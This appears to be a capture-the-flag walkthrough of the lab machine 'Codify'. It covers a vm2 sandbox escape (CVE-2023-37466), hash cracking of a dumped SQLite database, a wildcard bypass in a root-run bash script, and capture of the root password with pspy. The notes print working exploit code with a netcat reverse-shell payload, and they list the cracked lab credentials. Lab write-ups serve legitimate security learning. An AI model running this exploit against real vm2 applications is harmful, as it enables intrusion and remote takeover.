#box #vm2 #RCE #ReverseShell #sandbox-escape #nodejs #sqldump #sqlite #sudo-privileges #wildcards
1. The machine presents a website on port 80 and a replication of the same app on port 3000
2. By quickly enumerating the application we notice the application presents an endpoint named `/editor` where the user can put any `nodejs` code. However, there are some limitation, in fact the `child_process` module cannot be recalled.
3. By navigating on the `/about` page we notice that this editor is using the `vm2` library. By clicking on the URL we notice it links us directly to the `vm2` version that is being currently used by the application
![[attachments/codify-1.png]]
4. A vulnerability of Sandbox escape is present on the `vm2` library at https://nvd.nist.gov/vuln/detail/cve-2023-37466 and by copy pasting the code inside of that CVE it's possible to escape the sandbox and obtain a shell. To do so, we've used the following snippet:
```js
const {VM} = require("vm2");
const vm = new VM();

const code = `
async function fn() {
    (function stack() {
        new Error().stack;
        stack();
    })();
}
p = fn();
p.constructor = {
    [Symbol.species]: class FakePromise {
        constructor(executor) {
            executor(
                (x) => x,
                (err) => { return err.constructor.constructor('return process')().mainModule.require('child_process').execSync('busybox nc 10.10.14.194 2999 -e /bin/bash'); }
            )
        }
    }
};
p.then();
`;

console.log(vm.run(code));
```
5. Once obtained a shell, we discover a file named `tickets.db` at `/var/www/contact`. We download it on our end and the dump it to discover a hash for the user `joshua` which is also an user having tty on the target machine
![[attachments/codify-2.png]]
6. With the autorecognition function of hashcat (not specifying a type of hash) we discover this hash might be of type 3200, so we then crack it with that type discovering the password:
![[attachments/codify-3.png]]
7. After authenticating in SSH with the user `joshua:spongebob1` we discover we can run the script `/opt/scripts/mysql-backup.sh` as root. From a first sight the script seems unbreakable, but after a careful analysis we notice how the elements in the equation are not surrounded by `"`. This leads to an interpretation of the characters rather than a string comparison:
![[attachments/codify-4.png]]
	Basically, in this screenshot we could potentially inject a character or a wildcard and this would be interpreted instead of string compared. So, if we for instance said: `$DB_USER == *` (asterisk usually refers to 'anything') the equation would return true and the code execution would proceed. After doing so, we notice how the code execution ends and the file is backed up accordingly in `/var/backups/mysql` as mentioned in the variable name.
8. However, we cannot access that content since we have no access to this folder. To bypass that we opt to upload `pspy64` and execute again the script to check what's running under the hood and show the password in cleartext at execution time since the password variable is then passed as a variable to the `mysql` (and also `mysqldump`) variables:
![[attachments/codify-5.png]]
![[attachments/codify-6.png]]
	Discovering the password in clear sight to be:
![[attachments/codify-7.png]]
9. Once obtained the password for root we `sudo su` and input the password `kljh12k3jhaskjh12kjh3` to obtain a root session